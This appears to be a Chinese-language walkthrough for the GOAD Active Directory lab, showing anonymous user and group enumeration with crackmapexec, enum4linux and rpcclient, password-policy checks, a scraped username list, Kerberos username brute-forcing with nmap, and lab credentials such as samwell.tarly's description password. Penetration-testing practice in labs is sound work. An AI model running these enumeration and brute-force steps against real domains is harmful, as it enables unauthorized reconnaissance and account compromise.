# GOAD 寻找用户

## 匿名枚举 DC

### CME

使用cme枚举用户

```bash
crackmapexec smb 192.168.56.0/24 --users
```

```bash
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [-] Error enumerating domain users using dc ip 192.168.56.23: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
SMB         192.168.56.23   445    BRAAVOS          [*] Trying with SAMRPC protocol
SMB         192.168.56.10   445    KINGSLANDING     [-] Error enumerating domain users using dc ip 192.168.56.10: NTLM needs domain\username and a password
SMB         192.168.56.10   445    KINGSLANDING     [*] Trying with SAMRPC protocol
SMB         192.168.56.12   445    MEEREEN          [-] Error enumerating domain users using dc ip 192.168.56.12: NTLM needs domain\username and a password
SMB         192.168.56.22   445    CASTELBLACK      [-] Error enumerating domain users using dc ip 192.168.56.22: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
SMB         192.168.56.12   445    MEEREEN          [*] Trying with SAMRPC protocol
SMB         192.168.56.22   445    CASTELBLACK      [*] Trying with SAMRPC protocol
SMB         192.168.56.11   445    WINTERFELL       [-] Error enumerating domain users using dc ip 192.168.56.11: NTLM needs domain\username and a password
SMB         192.168.56.11   445    WINTERFELL       [*] Trying with SAMRPC protocol
SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated domain user(s)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Guest                          Built-in account for guest access to the computer/domain
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\arya.stark                     Arya Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sansa.stark                    Sansa Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\brandon.stark                  Brandon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\rickon.stark                   Rickon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\hodor                          Brainless Giant
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jon.snow                       Jon Snow
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\samwell.tarly                  Samwell Tarly (Password : Heartsbane)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jeor.mormont                   Jeor Mormont
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        sql service
```

获取了用户信息，发现samwell.tarly备注密码是Heartsbane

在开始爆破前，检索密码策略

```bash
cme smb 192.168.56.11 --pass-pol
```

```bash
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] Dumping password info for domain: NORTH
SMB         192.168.56.11   445    WINTERFELL       Minimum password length: 5
SMB         192.168.56.11   445    WINTERFELL       Password history length: 24
SMB         192.168.56.11   445    WINTERFELL       Maximum password age: 311 days 2 minutes 
SMB         192.168.56.11   445    WINTERFELL       
SMB         192.168.56.11   445    WINTERFELL       Password Complexity Flags: 000000
SMB         192.168.56.11   445    WINTERFELL        Domain Refuse Password Change: 0
SMB         192.168.56.11   445    WINTERFELL        Domain Password Store Cleartext: 0
SMB         192.168.56.11   445    WINTERFELL        Domain Password Lockout Admins: 0
SMB         192.168.56.11   445    WINTERFELL        Domain Password No Clear Change: 0
SMB         192.168.56.11   445    WINTERFELL        Domain Password No Anon Change: 0
SMB         192.168.56.11   445    WINTERFELL        Domain Password Complex: 0
SMB         192.168.56.11   445    WINTERFELL       
SMB         192.168.56.11   445    WINTERFELL       Minimum password age: 1 day 4 minutes 
SMB         192.168.56.11   445    WINTERFELL       Reset Account Lockout Counter: 5 minutes 
SMB         192.168.56.11   445    WINTERFELL       Locked Account Duration: 5 minutes 
SMB         192.168.56.11   445    WINTERFELL       Account Lockout Threshold: 5
SMB         192.168.56.11   445    WINTERFELL       Forced Log off Time: Not Set
```

密码策略设置是，如果在 5 分钟内失败 5 次，我们将锁定帐户 5 分钟

### enum4linux

常规信息

```bash
 =========================================( Target Information )=========================================

Target ........... 192.168.56.11
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 192.168.56.11 )===========================


[+] Got domain/workgroup name: NORTH


 ===============================( Nbtstat Information for 192.168.56.11 )===============================

Looking up status of 192.168.56.11
 NORTH           <1c> - <GROUP> B <ACTIVE>  Domain Controllers
 NORTH           <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
 WINTERFELL      <00> -         B <ACTIVE>  Workstation Service
 WINTERFELL      <20> -         B <ACTIVE>  File Server Service
 NORTH           <1b> -         B <ACTIVE>  Domain Master Browser

 MAC Address = 08-00-27-34-1F-C8

 ===================================( Session Check on 192.168.56.11 )===================================


[+] Server 192.168.56.11 allows sessions using username '', password ''


 ================================( Getting domain SID for 192.168.56.11 )================================

Domain Name: NORTH
Domain Sid: S-1-5-21-2098312621-1904462239-3964181367

[+] Host is part of a domain (not a workgroup)


 ==================================( OS information on 192.168.56.11 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 192.168.56.11 from srvinfo: 
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

```

用户信息

```bash
 =======================================( Users on 192.168.56.11 )=======================================

index: 0x189b RID: 0x456 acb: 0x00000210 Account: arya.stark Name: (null) Desc: Arya Stark
index: 0x18a7 RID: 0x45b acb: 0x00010210 Account: brandon.stark Name: (null) Desc: Brandon Stark
index: 0x16fa RID: 0x1f5 acb: 0x00000215 Account: Guest Name: (null) Desc: Built-in account for guest access to the computer/domain
index: 0x18ab RID: 0x45d acb: 0x00000210 Account: hodor Name: (null) Desc: Brainless Giant
index: 0x18b1 RID: 0x460 acb: 0x00000210 Account: jeor.mormont Name: (null) Desc: Jeor Mormont
index: 0x18ad RID: 0x45e acb: 0x00040210 Account: jon.snow Name: (null) Desc: Jon Snow
index: 0x18a9 RID: 0x45c acb: 0x00000210 Account: rickon.stark Name: (null) Desc: Rickon Stark
index: 0x18af RID: 0x45f acb: 0x00000210 Account: samwell.tarly Name: (null) Desc: Samwell Tarly (Password : Heartsbane)
index: 0x18a6 RID: 0x45a acb: 0x00000210 Account: sansa.stark Name: (null) Desc: Sansa Stark
index: 0x18b3 RID: 0x461 acb: 0x00000210 Account: sql_svc Name: (null) Desc: sql service

user:[Guest] rid:[0x1f5]
user:[arya.stark] rid:[0x456]
user:[sansa.stark] rid:[0x45a]
user:[brandon.stark] rid:[0x45b]
user:[rickon.stark] rid:[0x45c]
user:[hodor] rid:[0x45d]
user:[jon.snow] rid:[0x45e]
user:[samwell.tarly] rid:[0x45f]
user:[jeor.mormont] rid:[0x460]
user:[sql_svc] rid:[0x461]

 =================================( Share Enumeration on 192.168.56.11 )=================================

do_connect: Connection to 192.168.56.11 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

 Sharename       Type      Comment
 ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.56.11
```

密码策略

```bash
 ===========================( Password Policy Information for 192.168.56.11 )===========================



[+] Attaching to 192.168.56.11 using a NULL share

[+] Trying protocol 139/SMB...

 [!] Protocol failed: Cannot request session (Called Name:192.168.56.11)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

 [+] NORTH
 [+] Builtin

[+] Password Info for Domain: NORTH

 [+] Minimum password length: 5
 [+] Password history length: 24
 [+] Maximum password age: 311 days 2 minutes 
 [+] Password Complexity Flags: 000000

  [+] Domain Refuse Password Change: 0
  [+] Domain Password Store Cleartext: 0
  [+] Domain Password Lockout Admins: 0
  [+] Domain Password No Clear Change: 0
  [+] Domain Password No Anon Change: 0
  [+] Domain Password Complex: 0

 [+] Minimum password age: 1 day 4 minutes 
 [+] Reset Account Lockout Counter: 5 minutes 
 [+] Locked Account Duration: 5 minutes 
 [+] Account Lockout Threshold: 5
 [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5

```

枚举域组成员得到完整的域用户列表

```bash
 ======================================( Groups on 192.168.56.11 )======================================


[+] Getting builtin groups:

group:[Guests] rid:[0x222]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[Storage Replica Administrators] rid:[0x246]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Users] rid:[0x221]

[+]  Getting builtin group memberships:

Group: Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group: Users' (RID: 545) has member: Couldn't lookup SIDs
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group: IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group: Remote Desktop Users' (RID: 555) has member: Couldn't lookup SIDs
Group: Guests' (RID: 546) has member: Couldn't lookup SIDs

[+]  Getting local groups:

group:[Cert Publishers] rid:[0x205]
group:[RAS and IAS Servers] rid:[0x229]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44e]
group:[AcrossTheSea] rid:[0x455]

[+]  Getting local group memberships:

Group: Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs
Group: AcrossTheSea' (RID: 1109) has member: Couldn't lookup SIDs

[+]  Getting domain groups:

group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44f]
group:[Stark] rid:[0x452]
group:[Night Watch] rid:[0x453]
group:[Mormont] rid:[0x454]

[+]  Getting domain group memberships:

Group: 'Stark' (RID: 1106) has member: NORTH\arya.stark
Group: 'Stark' (RID: 1106) has member: NORTH\eddard.stark
Group: 'Stark' (RID: 1106) has member: NORTH\catelyn.stark
Group: 'Stark' (RID: 1106) has member: NORTH\robb.stark
Group: 'Stark' (RID: 1106) has member: NORTH\sansa.stark
Group: 'Stark' (RID: 1106) has member: NORTH\brandon.stark
Group: 'Stark' (RID: 1106) has member: NORTH\rickon.stark
Group: 'Stark' (RID: 1106) has member: NORTH\hodor
Group: 'Stark' (RID: 1106) has member: NORTH\jon.snow
Group: 'Night Watch' (RID: 1107) has member: NORTH\jon.snow
Group: 'Night Watch' (RID: 1107) has member: NORTH\samwell.tarly
Group: 'Night Watch' (RID: 1107) has member: NORTH\jeor.mormont
Group: 'Mormont' (RID: 1108) has member: NORTH\jeor.mormont
Group: 'Domain Computers' (RID: 515) has member: NORTH\CASTELBLACK$
Group: 'Group Policy Creator Owners' (RID: 520) has member: NORTH\Administrator
Group: 'Domain Users' (RID: 513) has member: NORTH\Administrator
Group: 'Domain Users' (RID: 513) has member: NORTH\vagrant
Group: 'Domain Users' (RID: 513) has member: NORTH\krbtgt
Group: 'Domain Users' (RID: 513) has member: NORTH\SEVENKINGDOMS$
Group: 'Domain Users' (RID: 513) has member: NORTH\arya.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\eddard.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\catelyn.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\robb.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\sansa.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\brandon.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\rickon.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\hodor
Group: 'Domain Users' (RID: 513) has member: NORTH\jon.snow
Group: 'Domain Users' (RID: 513) has member: NORTH\samwell.tarly
Group: 'Domain Users' (RID: 513) has member: NORTH\jeor.mormont
Group: 'Domain Users' (RID: 513) has member: NORTH\sql_svc
Group: 'Domain Guests' (RID: 514) has member: NORTH\Guest

 ==================( Users on 192.168.56.11 via RID cycling (RIDS: 500-550,1000-1050) )==================


[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.


 ===============================( Getting printer info for 192.168.56.11 )===============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sat Jun  3 09:57:42 2023

```

### rpcclient枚举

相对标识符(Relative Identifier，RID)是Windows用于跟踪和识别对象的唯一标识符(十六进制表示)
为了说明它的作用，让我们看下面的示例：

* NAME_DOMAIN.LOCAL域的SID是：S-1-5-21-1038751438-1834703946-36937684957

* 在域内创建对象时，上述数字(SID)将与RID组合，以生成一个用于表示对象的唯一值
因此，带有RID：[0x457] Hex 0x457等于十进制数1111的域用户john，其完整的用户SID为：S-1-5-21-1038751438-1834703946-36937684957-1111

* 这是该域中john对象的唯一标识符，您永远不会在该域或任何其他域中看到此配对值与其他对象相关联

定义来自[此处](https://academy.hackthebox.com/module/143/section/1269)

您可以使用Samba rpcclient实用程序通过命名管道与RPC端点交互以下列出了在建立SMB会话后(通常需要凭据)可以向SAMR、LSARPC和LSARPC-DS接口发出的命令

rpcclient连接

```bash
rpcclient -U "NORTH\\" 192.168.56.11 -N
```

域信息

```bash
rpcclient $> querydominfo
```

```bash
Domain:  NORTH
Server:  
Comment: 
Total Users: 52
Total Groups: 73
Total Aliases: 14
Sequence No: 1
Force Logoff: -1
Domain Server State: 0x1
Server Role: ROLE_DOMAIN_PDC
Unknown 3: 0x1
```

枚举域用户

```bash
rpcclient $> enumdomusers
```

```bash
user:[Guest] rid:[0x1f5]
user:[arya.stark] rid:[0x456]
user:[sansa.stark] rid:[0x45a]
user:[brandon.stark] rid:[0x45b]
user:[rickon.stark] rid:[0x45c]
user:[hodor] rid:[0x45d]
user:[jon.snow] rid:[0x45e]
user:[samwell.tarly] rid:[0x45f]
user:[jeor.mormont] rid:[0x460]
user:[sql_svc] rid:[0x461]
rpcclient $> enumdomgroups
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44f]
group:[Stark] rid:[0x452]
group:[Night Watch] rid:[0x453]
group:[Mormont] rid:[0x454]
```

枚举域组

```bash
rpcclient $> enumdomgroups
```

```bash
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44f]
group:[Stark] rid:[0x452]
group:[Night Watch] rid:[0x453]
group:[Mormont] rid:[0x454]
```

组查询

```bash
rpcclient $> querygroup 0x201
```

```bash
 Group Name: Domain Users
 Description: All domain users
 Group Attribute:7
 Num Members:16
```

用户信息查询

```bash
rpcclient $> queryuser jon.snow
```

```bash
 User Name   : jon.snow
 Full Name   : 
 Home Drive  : 
 Dir Drive   : 
 Profile Path: 
 Logon Script: 
 Description : Jon Snow
 Workstations: 
 Comment     : 
 Remote Dial :
 Logon Time               : Wed, 31 Dec 1969 19:00:00 EST
 Logoff Time              : Wed, 31 Dec 1969 19:00:00 EST
 Kickoff Time             : Wed, 13 Sep 30828 22:48:05 EDT
 Password last set Time   : Wed, 31 May 2023 05:44:15 EDT
 Password can change Time : Thu, 01 Jun 2023 05:44:15 EDT
 Password must change Time: Wed, 13 Sep 30828 22:48:05 EDT
 unknown_2[0..31]...
 user_rid : 0x45e
 group_rid: 0x201
 acb_info : 0x00040210
 fields_present: 0x00ffffff
 logon_divs: 168
 bad_password_count: 0x00000000
 logon_count: 0x00000000
 padding1[0..7]...
 logon_hrs[0..21]...
```

枚举权限

```bash
rpcclient $> enumprivs
```

```bash
found 35 privileges

SeCreateTokenPrivilege   0:2 (0x0:0x2)
SeAssignPrimaryTokenPrivilege   0:3 (0x0:0x3)
SeLockMemoryPrivilege   0:4 (0x0:0x4)
SeIncreaseQuotaPrivilege   0:5 (0x0:0x5)
SeMachineAccountPrivilege   0:6 (0x0:0x6)
SeTcbPrivilege   0:7 (0x0:0x7)
SeSecurityPrivilege   0:8 (0x0:0x8)
SeTakeOwnershipPrivilege   0:9 (0x0:0x9)
SeLoadDriverPrivilege   0:10 (0x0:0xa)
SeSystemProfilePrivilege   0:11 (0x0:0xb)
SeSystemtimePrivilege   0:12 (0x0:0xc)
SeProfileSingleProcessPrivilege   0:13 (0x0:0xd)
SeIncreaseBasePriorityPrivilege   0:14 (0x0:0xe)
SeCreatePagefilePrivilege   0:15 (0x0:0xf)
SeCreatePermanentPrivilege   0:16 (0x0:0x10)
SeBackupPrivilege   0:17 (0x0:0x11)
SeRestorePrivilege   0:18 (0x0:0x12)
SeShutdownPrivilege   0:19 (0x0:0x13)
SeDebugPrivilege   0:20 (0x0:0x14)
SeAuditPrivilege   0:21 (0x0:0x15)
SeSystemEnvironmentPrivilege   0:22 (0x0:0x16)
SeChangeNotifyPrivilege   0:23 (0x0:0x17)
SeRemoteShutdownPrivilege   0:24 (0x0:0x18)
SeUndockPrivilege   0:25 (0x0:0x19)
SeSyncAgentPrivilege   0:26 (0x0:0x1a)
SeEnableDelegationPrivilege   0:27 (0x0:0x1b)
SeManageVolumePrivilege   0:28 (0x0:0x1c)
SeImpersonatePrivilege   0:29 (0x0:0x1d)
SeCreateGlobalPrivilege   0:30 (0x0:0x1e)
SeTrustedCredManAccessPrivilege   0:31 (0x0:0x1f)
SeRelabelPrivilege   0:32 (0x0:0x20)
SeIncreaseWorkingSetPrivilege   0:33 (0x0:0x21)
SeTimeZonePrivilege   0:34 (0x0:0x22)
SeCreateSymbolicLinkPrivilege   0:35 (0x0:0x23)
SeDelegateSessionUserImpersonatePrivilege   0:36 (0x0:0x24)
```

获取所有域用户

```bash
net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'
```

```bash
NORTH\Administrator
NORTH\vagrant
NORTH\krbtgt
NORTH\SEVENKINGDOMS$
NORTH\arya.stark
NORTH\eddard.stark
NORTH\catelyn.stark
NORTH\robb.stark
NORTH\sansa.stark
NORTH\brandon.stark
NORTH\rickon.stark
NORTH\hodor
NORTH\jon.snow
NORTH\samwell.tarly
NORTH\jeor.mormont
NORTH\sql_svc
```

更多[RPCClient枚举示例](http://mp.weixin.qq.com/s?__biz=Mzg4MTU4NTc2Nw==&mid=2247489122&idx=3&sn=72b43e57f58067cded2e8c4f9d463363&chksm=cf62ed6af815647c5ddd1d33f2f0756c7d4cc9ca00b55f2bc3f33e0d2da7b021d5d70519f081&scene=126&sessionid=1681098428&key=c7398c8b43a1c905a5ae257650d186b13c0efc5e3526f811db661164fd0528e97f2b32e97cd6ac88fb143761a0a67a4a6e39f5cb1e7f934a1fcf0970fea3ed62ddadcf0c104356c521d0c824e8c572c8afd02f0de531296d6bf9f5f2de3b83fc2e3e8135929c7852106c5b72d9d28eca10b68fa6ef219d456306600f2871c36a&ascene=15&uin=MzgxODQ4MjMz&devicetype=Windows+10+x64&version=6309001c&lang=zh_CN&session_us=gh_13b943a0d2c7&countrycode=GY&exportkey=n_ChQIAhIQ2zfP8uzL6k%2BCCEXT3oBoIxLvAQIE97dBBAEAAAAAAO2vJSsHQ0oAAAAOpnltbLcz9gKNyK89dVj0gK4QFWu8WXKoEc8ehFpvwcIzGFM7yeR%2BZnh9QzvxZIK53Z2MOZkGEz6bWk%2FMYuPskJOcSlWwuDBRZNN91DB1IvuPQCLpfGNa1guy2hhH0xtSSv4vRankCgsv7OPvk8fsrymFJ5o%2FjIbconJ1f6PwVuubc9zHQ4A95P4GMB9R%2BfnQhbjs2LD7yMef%2Bc22uRj7UNeqHNWRoWubMeKEmChd8CxBCl%2F0xpH1gXNZRyZNwS8XeMz5Y8mYpghk5BQPJ7CRag9wX6tl8Pne&acctmode=0&pass_)

## 匿名枚举 DC

Winterfell域控制器允许匿名连接,这就是我们可以列出域用户和组的原因

但是现在几乎不会发生这种类型的配置(相反，在用户描述中使用密码经常发生x)

使用暴力破解来枚举有效用户

生成用户名字典

```bash
curl -s https://www.hbo.com/game-of-thrones/cast-and-crew | grep 'href="/game-of-thrones/cast-and-crew/'| grep -o 'aria-label="[^"]*"' | cut -d '"' -f 2 | awk '{if($2 == "") {print tolower($1)} else {print tolower($1) "." tolower($2);} }' > got_users.txt
```

```bash
cat got_users.txt
```

```bash
robert.baratheon
robert.baratheon
tyrion.lannister
tyrion.lannister
cersei.lannister
cersei.lannister
catelyn.stark
catelyn.stark
jaime.lannister
jaime.lannister
daenerys.targaryen
daenerys.targaryen
viserys.targaryen
viserys.targaryen
jon.snow
jon.snow
robb.stark
robb.stark
sansa.stark
sansa.stark
arya.stark
arya.stark
bran.stark
bran.stark
rickon.stark
rickon.stark
joffrey.baratheon
joffrey.baratheon
jorah.mormont
jorah.mormont
theon.greyjoy
theon.greyjoy
samwell.tarly
samwell.tarly
renly.baratheon
renly.baratheon
ros
ros
jeor.mormont
jeor.mormont
gendry
gendry
lysa.arryn
lysa.arryn
robin.arryn
robin.arryn
bronn
bronn
grand.maester
grand.maester
varys
varys
loras.tyrell
loras.tyrell
shae
shae
benjen.stark
benjen.stark
barristan.selmy
barristan.selmy
khal.drogo
khal.drogo
hodor
hodor
lancel.lannister
lancel.lannister
maester.luwin
maester.luwin
alliser.thorne
alliser.thorne
osha
osha
maester.aemon
maester.aemon
talisa.stark
talisa.stark
brienne.of
brienne.of
davos.seaworth
davos.seaworth
tywin.lannister
tywin.lannister
stannis.baratheon
stannis.baratheon
margaery.tyrell
margaery.tyrell
ygritte
ygritte
balon.greyjoy
balon.greyjoy
roose.bolton
roose.bolton
gilly
gilly
podrick.payne
podrick.payne
melisandre
melisandre
yara.greyjoy
yara.greyjoy
jaqen.h’ghar
jaqen.h’ghar
grey.worm
grey.worm
beric.dondarrion
beric.dondarrion
missandei
missandei
mance.rayder
mance.rayder
tormund
tormund
ramsay.snow
ramsay.snow
olenna.tyrell
olenna.tyrell
thoros.of
thoros.of
orell
orell
qyburn
qyburn
brynden.tully
brynden.tully
tommen.baratheon
tommen.baratheon
daario.naharis
daario.naharis
oberyn.martell
oberyn.martell
myrcella.baratheon
myrcella.baratheon
obara.sand
obara.sand
nym.sand
nym.sand
tyene.sand
tyene.sand
high.sparrow
high.sparrow
trystane.martell
trystane.martell
doran.martell
doran.martell
euron.greyjoy
euron.greyjoy
lady.crane
lady.crane
high.priestess
high.priestess
randyll.tarly
randyll.tarly
izembaro
izembaro
brother.ray
brother.ray
archmaester.ebrose
archmaester.ebrose
```

使用nmap爆破sevenkingdoms.local

```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=got_users.txt" 192.168.56.10
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 08:54 EDT
Nmap scan report for sevenkingdoms.local (192.168.56.10)
Host is up (0.0016s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     robert.baratheon@sevenkingdoms.local
|     joffrey.baratheon@sevenkingdoms.local
|     cersei.lannister@sevenkingdoms.local
|     joffrey.baratheon@sevenkingdoms.local
|     renly.baratheon@sevenkingdoms.local
|     stannis.baratheon@sevenkingdoms.local
|     cersei.lannister@sevenkingdoms.local
|     tywin.lannister@sevenkingdoms.local
|     renly.baratheon@sevenkingdoms.local
|     jaime.lannister@sevenkingdoms.local
|     tywin.lannister@sevenkingdoms.local
|     jaime.lannister@sevenkingdoms.local
|     stannis.baratheon@sevenkingdoms.local
|_    robert.baratheon@sevenkingdoms.local

Nmap done: 1 IP address (1 host up) scanned in 0.60 seconds
```

使用nmap爆破essos.local

```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='essos.local',userdb=got_users.txt" 192.168.56.12 -Pn
```

```bash
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 09:20 EDT
Nmap scan report for essos.local (192.168.56.12)
Host is up (0.0021s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     daenerys.targaryen@essos.local
|     viserys.targaryen@essos.local
|     jorah.mormont@essos.local
|     jorah.mormont@essos.local
|     viserys.targaryen@essos.local
|     khal.drogo@essos.local
|     daenerys.targaryen@essos.local
|_    khal.drogo@essos.local

Nmap done: 1 IP address (1 host up) scanned in 0.76 seconds
```

使用nmap爆破north.sevenkingdoms.local

```bash
 nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='north.sevenkingdoms.local',userdb=got_users.txt" 192.168.56.11 -Pn
 ```

 ```bash
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-04 09:22 EDT
Nmap scan report for winterfell.north.sevenkingdoms.local (192.168.56.11)
Host is up (0.0028s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|     rickon.stark@north.sevenkingdoms.local
|     robb.stark@north.sevenkingdoms.local
|     samwell.tarly@north.sevenkingdoms.local
|     jeor.mormont@north.sevenkingdoms.local
|     catelyn.stark@north.sevenkingdoms.local
|     arya.stark@north.sevenkingdoms.local
|     robb.stark@north.sevenkingdoms.local
|     hodor@north.sevenkingdoms.local
|     sansa.stark@north.sevenkingdoms.local
|     arya.stark@north.sevenkingdoms.local
|     catelyn.stark@north.sevenkingdoms.local
|     jon.snow@north.sevenkingdoms.local
|     hodor@north.sevenkingdoms.local
|     samwell.tarly@north.sevenkingdoms.local
|     jon.snow@north.sevenkingdoms.local
|     rickon.stark@north.sevenkingdoms.local
|     jeor.mormont@north.sevenkingdoms.local
|_    sansa.stark@north.sevenkingdoms.local
```

Script krb5-enum-users摘要:

>通过强制查询可能的用户名对Kerberos服务进行验证来发现有效的用户名

>当请求无效的用户名时，服务器将使用Kerberos错误代码KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN响应，从而使我们确定用户名无效

>有效的用户名将引起AS-REP响应中的TGT或错误KRB5KDC_ERR_PREAUTH_REQUIRED，表示需要用户执行预身份验证

当爆破用户时，badpwdcount值不会增加

用CME工具PoC:

```bash
 crackmapexec smb -u khal.drogo -p horse -d essos.local 192.168.56.12 --users
```

```bash
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.12   445    MEEREEN          [+] essos.local\khal.drogo:horse 
SMB         192.168.56.12   445    MEEREEN          [+] Enumerated domain user(s)
SMB         192.168.56.12   445    MEEREEN          essos.local\sql_svc                        badpwdcount: 0 desc: sql service
SMB         192.168.56.12   445    MEEREEN          essos.local\jorah.mormont                  badpwdcount: 0 desc: Jorah Mormont
SMB         192.168.56.12   445    MEEREEN          essos.local\khal.drogo                     badpwdcount: 0 desc: Khal Drogo
SMB         192.168.56.12   445    MEEREEN          essos.local\viserys.targaryen              badpwdcount: 0 desc: Viserys Targaryen
SMB         192.168.56.12   445    MEEREEN          essos.local\daenerys.targaryen             badpwdcount: 0 desc: Darnerys Targaryen
SMB         192.168.56.12   445    MEEREEN          essos.local\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         192.168.56.12   445    MEEREEN          essos.local\vagrant                        badpwdcount: 0 desc: Vagrant User
SMB         192.168.56.12   445    MEEREEN          essos.local\DefaultAccount                 badpwdcount: 0 desc: A user account managed by the system.
SMB         192.168.56.12   445    MEEREEN          essos.local\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         192.168.56.12   445    MEEREEN          essos.local\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

## 列出共享的Guest权限

查看访客对smb共享的访问

使用CME

```bash
crackmapexec smb 192.168.56.10-23 -u 'a' -p '' --shares
```

```bash

